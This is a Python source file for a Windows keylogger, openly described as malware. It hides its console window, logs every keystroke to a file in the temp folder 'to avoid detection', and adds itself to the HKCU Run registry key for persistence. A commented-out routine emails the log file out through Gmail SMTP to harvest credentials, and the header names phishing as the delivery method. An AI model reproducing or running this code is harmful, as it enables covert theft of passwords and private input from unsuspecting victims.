# -----------------------------------------------------------------------------------------------------------------------------
# 1. Creating Logfile in temp folder to avoid detection
# 2. Creating Email functionality to send the logFile to a temporary mail to get the credentials
# 3. Find the keylogger.py using subprocess and stores the path
# 4. For the persistence mechanism we use winreg and added the path of keylogger in registries
# 5. Used Windows API GetAsyncKeyState() to get the keystrokes
# 6. We deliver the payload using a phishing link   
# -----------------------------------------------------------------------------------------------------------------------------

import ctypes
import time
import subprocess
import winreg
import winreg
import os 

user32 = ctypes.WinDLL('user32', use_last_error=True)
VK_BACK = 0x08
VK_RETURN = 0x0D
VK_SHIFT = 0x10
VK_CONTROL = 0x11
VK_CAPITAL = 0x14
VK_TAB = 0x09
VK_MENU = 0x12
VK_LBUTTON = 0x01
VK_RBUTTON = 0x02
VK_MBUTTON = 0x04
VK_XBUTTON1 = 0x05
VK_XBUTTON2 = 0x06

SW_HIDE = 0

# --------------------------------------------------------------------------
#               Finding Our Keylogger Program
# --------------------------------------------------------------------------

program_name = "keylogger.py"
result = subprocess.run(
    ["where", program_name],
    capture_output=True,
    text=True
)
keylogger_path=result.stdout.strip()


# --------------------------------------------------------------------------
#               Persistence Mechanism
# --------------------------------------------------------------------------



def add_to_startup(app_name, app_path):
    try:
        # Open Run registry key
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0,
            winreg.KEY_SET_VALUE
        )

        # Add value
        winreg.SetValueEx(key, app_name, 0, winreg.REG_SZ, app_path)

        # Close key
        winreg.CloseKey(key)

    except Exception as e:
        pass

add_to_startup('keylogger.py',keylogger_path)


# --------------------------------------------------------------------------
#               Email Logic
# --------------------------------------------------------------------------

# import smtplib
# from email.message import EmailMessage
# import os

# username = os.getlogin()

# def send_file_email(
#     sender_email="your sender mail",
#     sender_password="",
#     receiver_email="your reciver mail",
#     subject=f"Log File from {username}",
#     body="WATCH THE BIRDIE",
#     file_path=fr"path to your log file"
# ):
#     # Create email
#     msg = EmailMessage()
#     msg["Subject"] = subject
#     msg["From"] = sender_email
#     msg["To"] = receiver_email
#     msg.set_content(body)

#     # Read and attach file
#     with open(file_path, "rb") as f:
#         file_data = f.read()
#         file_name = file_path.split("\\")[-1]

#     msg.add_attachment(
#         file_data,
#         maintype="application",
#         subtype="octet-stream",
#         filename=file_name
#     )

#     # Send email
#     with smtplib.SMTP_SSL("smtp.gmail.com", 465) as smtp:
#         smtp.login(sender_email, sender_password)
#         smtp.send_message(msg)

#     print("File sent successfully.")

# send_file_email()


# --------------------------------------------------------------------------
#               KEY LOGGER CODE
# --------------------------------------------------------------------------
username = os.getlogin()

def ShowWindow(hwnd, nCmdShow):
    return user32.ShowWindow(hwnd, nCmdShow)

def GetConsoleWindow():
    return ctypes.windll.kernel32.GetConsoleWindow()

def GetAsyncKeyState(vKey):
    return user32.GetAsyncKeyState(vKey)

def startLogging():
    logFile = open(fr"C:\Users\{username}\AppData\Local\Temp\minato.txt", "a")
    previous_shift = False
    while True:

        current_shift = bool(user32.GetAsyncKeyState(VK_SHIFT) & 0x8000)
        if current_shift and not previous_shift:
            logFile.write("[shift_down]")
        elif not current_shift and previous_shift:
            logFile.write("[shift_up]")
        previous_shift = current_shift

        for ch in range(255):
            if ch in (VK_SHIFT,VK_MENU):
                continue 
            if GetAsyncKeyState(ch) & 0x0001:
                    if ch == VK_BACK:
                        logFile.write("[backspace]")
                    elif ch == VK_RETURN:
                        logFile.write("[enter]\n")
                    elif ch == VK_CONTROL:
                        logFile.write("[control]")
                    elif ch == VK_CAPITAL:
                        logFile.write("[cap]")
                    elif ch == VK_TAB:
                        logFile.write("[tab]")
                    elif ch == VK_MENU:
                        logFile.write("[alt]")
                    elif ch in (VK_LBUTTON, VK_RBUTTON, VK_MBUTTON, VK_XBUTTON1, VK_XBUTTON2):
                        pass
                    else:
                        logFile.write(chr(ch))
        time.sleep(0.01)  # small delay to reduce CPU usage

if __name__ == "__main__":
    ShowWindow(GetConsoleWindow(), SW_HIDE)
    startLogging()

